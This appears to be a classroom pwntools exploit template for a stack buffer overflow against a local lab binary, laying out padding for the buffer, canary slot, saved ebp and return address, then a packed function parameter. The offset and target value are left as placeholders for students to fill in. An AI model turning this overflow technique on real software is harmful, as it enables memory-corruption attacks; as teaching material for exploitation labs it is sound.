#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from struct import pack

pinfo = process("./v2simpleBOF");

out = ''
# use the file command to figure out how many
# bytes each address has
# file ./v2simpleBOF 
# how many bits in a bytes
ADDR_SIZE = 4  # in bytes

# how big is this buffer we want to overflow?
# go look at the source code, how big is overflowme variable?
out += "A"*(XX); # buffer 

out += "B"* ADDR_SIZE   # in this version, it was compiled with STACK CANARIES

out += "C" * ADDR_SIZE  # spacing for 16 byte alignment of stack
out += "D" * ADDR_SIZE  # we needed 2 of them

# the saved ebp and eip are used to return to the previous frame
out += "E" * ADDR_SIZE  # saved ebp
out += "F" * ADDR_SIZE  # saved svip

# are we to the parmater yet, shesh, 

# now what value do we need? 
# go look at the source code
out += pack("<I",0xXXXXXXX) # first paramter of function

# send the payload
pinfo.send(out + "\n")

# gimme back control
pinfo.interactive()

